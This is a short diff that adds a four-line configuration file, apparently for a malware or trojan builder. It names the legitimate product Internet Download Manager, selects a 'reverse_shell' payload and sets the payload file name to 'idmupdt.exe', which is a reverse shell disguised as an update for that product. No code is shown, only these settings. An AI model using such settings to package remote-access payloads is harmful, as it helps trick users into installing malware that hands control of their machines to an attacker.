@@ -1,0 +1,4 @@
+reqs=1
+name=Internet Download Manager
+payload=reverse_shell
+PAYLOAD_NAME=idmupdt.exe
